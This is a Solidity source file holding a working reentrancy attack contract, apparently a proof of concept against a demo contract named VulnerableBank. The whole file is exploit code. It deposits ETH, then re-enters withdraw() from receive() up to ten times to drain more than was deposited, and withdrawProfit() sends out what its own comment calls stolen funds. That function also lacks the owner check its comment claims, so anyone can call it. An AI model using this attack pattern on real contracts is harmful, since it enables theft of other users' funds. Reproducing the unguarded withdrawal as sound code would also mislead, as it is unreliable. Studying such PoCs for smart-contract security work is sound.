// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title ReentrancyAttacker - PoC attack contract for VulnerableBank
/// @notice This contract exploits the reentrancy vulnerability in VulnerableBank.withdraw()
/// @dev The attack works because withdraw() sends ETH via .call{} BEFORE setting balance to 0,
///      allowing the attacker to re-enter withdraw() through receive().
contract ReentrancyAttacker {
    address public target;
    uint256 public attackCount;
    uint256 public constant MAX_REENTRIES = 10;

    constructor(address _target) {
        target = _target;
    }

    /// @notice Launch the reentrancy attack
    /// @dev Deposits ETH, then triggers withdraw which will re-enter via receive()
    function attack() external payable {
        // Step 1: Deposit funds into the vulnerable contract
        (bool depositSuccess, ) = target.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
        require(depositSuccess, "Deposit failed");

        // Step 2: Trigger first withdraw — this will cascade into reentrancy
        (bool withdrawSuccess, ) = target.call(
            abi.encodeWithSignature("withdraw()")
        );
        require(withdrawSuccess, "Withdraw failed");
    }

    /// @notice Fallback that triggers reentrancy
    /// @dev When VulnerableBank sends ETH here, we re-enter withdraw().
    ///      balances[msg.sender] is still > 0 (not yet zeroed), so withdraw() succeeds again.
    receive() external payable {
        if (msg.sender == target && attackCount < MAX_REENTRIES) {
            attackCount++;
            // Re-enter the vulnerable withdraw function
            // balance > 0 is still true because state hasn't been updated yet
            (bool success, ) = target.call(
                abi.encodeWithSignature("withdraw()")
            );
            // Ignore failure — will naturally stop when balance is 0
            if (!success) {
                // Expected on last iteration when balance is depleted
            }
        }
    }

    /// @notice Allow owner to withdraw stolen funds
    function withdrawProfit() external {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Withdraw profit failed");
    }
}
